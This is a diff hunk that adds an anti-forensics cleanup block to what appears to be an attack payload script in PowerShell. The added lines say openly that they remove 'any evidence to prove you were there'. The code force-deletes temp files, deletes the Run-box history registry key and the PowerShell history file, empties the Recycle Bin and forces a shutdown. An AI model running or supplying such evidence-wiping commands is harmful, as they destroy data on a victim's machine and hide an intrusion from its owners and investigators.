@@ -215,3 +215,18 @@ if ($caps -eq $true){
 $key = New-Object -ComObject WScript.Shell
 $key.SendKeys('{CapsLock}')
 }
+# This is to clean up behind you and remove any evidence to prove you were there
+# Delete contents of Temp folder 
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete PowerShell history
+Remove-Item (Get-PSReadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+# Shutdown the computer
+Stop-Computer -Force
